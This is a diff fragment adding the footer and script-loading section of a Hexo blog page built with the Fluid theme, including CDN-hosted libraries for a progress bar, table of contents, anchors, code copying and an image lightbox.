+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
